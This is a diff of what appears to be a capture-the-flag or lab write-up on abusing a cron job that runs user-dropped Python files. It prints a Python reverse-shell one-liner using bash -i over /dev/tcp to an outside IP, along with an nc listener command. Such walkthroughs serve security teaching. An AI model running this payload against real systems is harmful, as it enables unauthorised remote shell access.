@@ -29,4 +29,12 @@ The `run_files.sh` is just a script that enter the script folder, runs the file(
 
 A common attack vector would be to execute a python file that runs a reverse shell back to our machine. Since the script is run with user privileges, the reverse shell will ensure the connection runs with the user; giving us access. To execute this, and to allow python to run bash commands, we use the `os.system()` function which allows us to execute any command. The following code is a one-liner which is able to exploit this vulnerability:
 
-echo "import os;os.system(\"/bin/bash -c \'bash -i >& /dev/tcp/10.225.149.204/9995 0>&1\'\")" > exploit.py
+![image](https://user-images.githubusercontent.com/70077872/167413332-dadfb1b2-d2f8-4c73-a4a1-e59d99054a63.png)
+
+
+`echo "import os;os.system(\"/bin/bash -c \'bash -i >& /dev/tcp/10.225.149.204/9995 0>&1\'\")" > exploit.py`
+
+When the cronjob automatically runs the `run_files.sh` which runs the `exploit.py` file, we get a connection using `nc -nlvp 9995` for listening on any incoming connections:
+
+![image](https://user-images.githubusercontent.com/70077872/167413610-fabd9a39-cfb7-4b8f-9a89-38e273cd76f2.png)
+
